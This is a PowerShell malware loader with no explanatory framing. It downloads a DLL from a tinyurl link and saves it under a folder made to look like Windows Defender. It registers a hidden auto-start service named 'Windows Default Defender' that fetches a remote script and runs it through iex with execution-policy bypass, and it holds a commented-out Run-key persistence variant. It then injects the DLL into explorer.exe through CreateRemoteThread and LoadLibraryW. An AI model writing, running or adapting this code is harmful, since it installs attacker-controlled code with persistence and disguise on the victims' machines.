$outputDir = "C:\ProgramData\Microsoft\Defender"
$dllPath = "$outputDir\WinDefender.dll"
$scriptPath = "https://tinyurl.com/yvjzsyk3"

if (-not (Test-Path -Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force
}
if (-not (Test-Path -Path $dllPath)) {
    $dllUrl = "https://tinyurl.com/2s35eutk"
    
    Invoke-WebRequest -Uri $dllUrl -OutFile "$dllPath" -UseBasicP -ErrorAction Stop


    # New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    #     -Name "WinDefender" `
    #     -Value "powershell -Command `"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command iwr -Uri $scriptPath -UseBasicParsing | iex' -Verb RunAs  -WindowStyle Hidden`""`
    #     -PropertyType String -Force
}

# Create a Windows service that runs a custom command
$serviceName = "WinDefender"
$binPath = "C:\Windows\system32\cmd.exe /c powershell -Command `"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command iwr -Uri $scriptPath -UseBasicParsing | iex' -Verb RunAs  -WindowStyle Hidden`""
$startType = "auto"
$displayName = "Windows Default Defender"

# Create the service
sc.exe create $serviceName binPath= $binPath start= $startType DisplayName= $displayName

# Define necessary Win32 API functions via P/Invoke
$signature = @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
"@

Add-Type -MemberDefinition $signature -Namespace Win32 -Name NativeMethods

# Process Access Rights
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_READWRITE = 0x04

# Get the explorer.exe process PID
$explorerProcess = Get-Process -Name explorer
$explorerPid = $explorerProcess.Id  # Use a different variable name
Write-Host "Injecting into explorer.exe with PID: $explorerPid"

# Open the process
$hProcess = [Win32.NativeMethods]::OpenProcess($PROCESS_ALL_ACCESS, $false, $explorerPid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open process." -ForegroundColor Red
    exit
}

# The DLL to inject (full path)

$dllBytes = [System.Text.Encoding]::Unicode.GetBytes($dllPath)

# Allocate memory in the target process
$remoteMemory = [Win32.NativeMethods]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]($dllBytes.Length), $MEM_COMMIT, $PAGE_READWRITE)
if ($remoteMemory -eq [IntPtr]::Zero) {
    Write-Host "Failed to allocate memory in target process." -ForegroundColor Red
    [Win32.NativeMethods]::CloseHandle($hProcess)
    exit
}

# Write the DLL path into the allocated memory
[UIntPtr] $bytesWritten = [UIntPtr]::Zero
$success = [Win32.NativeMethods]::WriteProcessMemory($hProcess, $remoteMemory, $dllBytes, [uint32]$dllBytes.Length, [ref] $bytesWritten)
if (-not $success) {
    Write-Host "Failed to write DLL path to process memory." -ForegroundColor Red
    [Win32.NativeMethods]::CloseHandle($hProcess)
    exit
}

# Get the address of LoadLibraryW in kernel32.dll
$hKernel32 = [Win32.NativeMethods]::GetModuleHandle("kernel32.dll")
$loadLibraryAddr = [Win32.NativeMethods]::GetProcAddress($hKernel32, "LoadLibraryW")

# Create a remote thread in explorer.exe to call LoadLibraryW with our DLL path
$hThread = [Win32.NativeMethods]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $remoteMemory, 0, [IntPtr]::Zero)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Host "Failed to create remote thread." -ForegroundColor Red
    [Win32.NativeMethods]::CloseHandle($hProcess)
    exit
}

# Wait for the thread to finish
[Win32.NativeMethods]::WaitForSingleObject($hThread, [UInt32]::MaxValue)

# Cleanup
[Win32.NativeMethods]::CloseHandle($hThread)
[Win32.NativeMethods]::CloseHandle($hProcess)

Write-Host "DLL injected successfully!"
